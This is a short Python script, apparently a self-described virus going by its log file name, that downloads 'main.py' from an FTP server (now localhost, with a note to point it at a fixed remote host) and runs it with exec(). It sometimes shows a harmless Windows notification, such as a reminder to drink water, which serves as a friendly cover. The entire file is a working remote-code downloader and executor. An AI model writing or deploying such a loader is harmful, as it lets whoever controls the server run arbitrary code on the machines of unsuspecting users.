import sys
from ftplib import FTP
from datetime import datetime
import time
from win10toast import ToastNotifier
from random import *
import logging

# The time to wait in seconds before executing the script
WAIT_TIME = 2

# The list of potentially useful things to tell the user
# TODO: Expand the list with more things
USER_TELL_STRINGS = [
    'Don\'t forget to drink Water.',
    'Never gonna give you up...',
    'The first bug was a literal bug that crawled into a computer system.'
]


# Connect to the FTP server
def ftp_connect():
    logging.debug('Connecting to server...')
    ftp = FTP('localhost')  # TODO: Replace address with fixed remote host address
    ftp.login()
    return ftp


# Download the new file from the FTP server
def ftp_download(ftp):
    # Create the unique name under which the new file is to be stored based on the current date and time
    filename = datetime.now().strftime("%d-%M-%Y_%H-%M-%S")
    logging.info(f' Downloading file as {filename}.py')
    # Download the file and store it
    with open(f'{filename}.py', 'wb') as fp:
        logging.debug(ftp.retrbinary(f'RETR main.py', fp.write))
    return filename


# Say something potentially useful to the user
def tell_user():
    # Only with a chance of 20%, the code gets executed
    if randint(1, 100) >= 80:
        logging.info('Saying something to the user:')
        # Select a random string from the list
        notification_text = USER_TELL_STRINGS[randint(0, len(USER_TELL_STRINGS) - 1)]
        logging.info(notification_text)
        # Initialize the notification
        notification = ToastNotifier()
        # Create the notification and set its timeout
        notification.show_toast('Attention please', notification_text, duration=3)


# Execute the previously downloaded file
def execute_file(filename):
    logging.debug('Opening and executing file')
    exec(open(f'{filename}.py').read())


if __name__ == '__main__':
    try:
        # Initialize logging
        logging.basicConfig(filename='netter_virus_logs.log', level=logging.DEBUG, format='%(asctime)s %(message)s')
        # Wait before executing the application
        logging.debug(f'Entering wait duration of {WAIT_TIME} seconds...')
        time.sleep(WAIT_TIME)
        # Commence with the execution
        connection = ftp_connect()
        name = ftp_download(connection)
        connection.close()
        tell_user()
        execute_file(name)
    except:
        # If any exception occurs, the program is to log it and exit
        logging.exception('An error occurred')
        print('An error occurred, see the log file for further information.')
        sys.exit(1)
